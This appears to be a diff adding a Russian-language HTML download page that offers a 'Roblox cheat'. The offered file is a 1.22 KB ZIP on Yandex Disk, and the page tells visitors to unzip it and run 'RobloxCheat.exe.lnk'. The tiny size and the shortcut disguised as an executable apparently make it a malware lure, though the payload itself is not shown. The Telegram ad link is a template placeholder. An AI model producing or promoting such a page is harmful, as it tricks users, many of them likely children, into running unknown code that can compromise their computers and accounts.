@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RobloxCerh</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #0a0a1a;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 40px;
+            padding: 40px 45px;
+            text-align: center;
+            max-width: 440px;
+            width: 90%;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .logo {
+            font-size: 38px;
+            font-weight: 900;
+            color: #fff;
+            margin-bottom: 5px;
+        }
+        .logo span {
+            background: linear-gradient(135deg, #00d4ff, #007bff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .subtitle {
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 12px;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            margin-bottom: 25px;
+        }
+        .ad {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.08), rgba(255, 100, 0, 0.04));
+            border: 1px solid rgba(255, 215, 0, 0.15);
+            border-radius: 16px;
+            padding: 14px 18px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            text-align: left;
+            transition: 0.3s;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .ad:hover {
+            background: rgba(255, 215, 0, 0.14);
+            border-color: rgba(255, 215, 0, 0.3);
+            transform: scale(1.02);
+        }
+        .ad-icon {
+            font-size: 28px;
+            flex-shrink: 0;
+        }
+        .ad-text {
+            flex: 1;
+        }
+        .ad-title {
+            color: #ffd700;
+            font-size: 14px;
+            font-weight: 700;
+        }
+        .ad-desc {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 12px;
+        }
+        .ad-label {
+            background: rgba(255, 215, 0, 0.15);
+            color: #ffd700;
+            font-size: 9px;
+            padding: 2px 8px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .icon-box {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(0, 123, 255, 0.05));
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(0, 212, 255, 0.1);
+        }
+        .icon-box img {
+            width: 55px;
+            height: 55px;
+        }
+        .file-name {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+        .file-size {
+            color: rgba(255, 255, 255, 0.35);
+            font-size: 13px;
+            margin-bottom: 25px;
+        }
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #00d4ff, #007bff);
+            color: #fff;
+            border: none;
+            padding: 15px 50px;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            width: 100%;
+        }
+        .btn:hover {
+            transform: scale(1.03);
+            box-shadow: 0 0 40px rgba(0, 123, 255, 0.4);
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .footer {
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.1);
+            font-size: 11px;
+            letter-spacing: 2px;
+        }
+        .installer-note {
+            margin-top: 15px;
+            padding: 12px 15px;
+            background: rgba(0, 212, 255, 0.05);
+            border: 1px solid rgba(0, 212, 255, 0.08);
+            border-radius: 12px;
+            color: rgba(255, 255, 255, 0.35);
+            font-size: 12px;
+            line-height: 1.5;
+            text-align: center;
+        }
+        .installer-note strong {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .installer-note span {
+            color: #00d4ff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">ROBLOX<span>CERH</span></div>
+        <div class="subtitle">Скачать файл</div>
+
+        <a href="https://t.me/твой_канал" target="_blank" class="ad">
+            <div class="ad-icon">🔥</div>
+            <div class="ad-text">
+                <div class="ad-title">Telegram канал</div>
+                <div class="ad-desc">Подпишись — там много интересного!</div>
+            </div>
+            <div class="ad-label">Реклама</div>
+        </a>
+
+        <div class="icon-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Windows_11_executable.svg/250px-Windows_11_executable.svg.png" alt="ZIP Icon">
+        </div>
+
+        <div class="file-name">RobloxCheat.zip</div>
+        <div class="file-size">1.22 KБ • Версия 1.0</div>
+
+        <a href="https://disk.yandex.ru/d/7_PoZZ8roqIl6Q?download=1" class="btn">⬇ Скачать файл</a>
+
+        <div class="installer-note">
+            ⚡ Это инсталлер — вес всего 1.22 KБ<br>
+            После распаковки запустите RobloxCheat.exe.lnk
+        </div>
+
+        <div class="footer">© 2026 RobloxCerh</div>
+    </div>
+</body>
+</html>
